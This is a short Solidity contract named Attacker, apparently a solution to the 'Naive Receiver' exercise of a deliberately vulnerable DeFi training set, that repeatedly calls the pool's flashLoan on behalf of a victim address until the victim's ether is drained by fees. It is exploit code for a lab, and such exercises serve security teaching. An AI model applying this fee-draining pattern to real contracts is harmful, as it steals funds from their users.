// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";
import "hardhat/console.sol";

contract Attacker {
    using Address for address payable;
    NaiveReceiverLenderPool private pool;
    address private victim;

    constructor(address payable poolAddress, address payable victimAddress) {
        victim = victimAddress;
        // Will this be read buy contract
        pool = NaiveReceiverLenderPool(poolAddress);
    }

    // Function called by the pool during flash loan
    function receiveEther(uint256 fee) public payable {
        while (victim.balance >= 1) {
            pool.flashLoan(victim, 0);
        }
    }
}
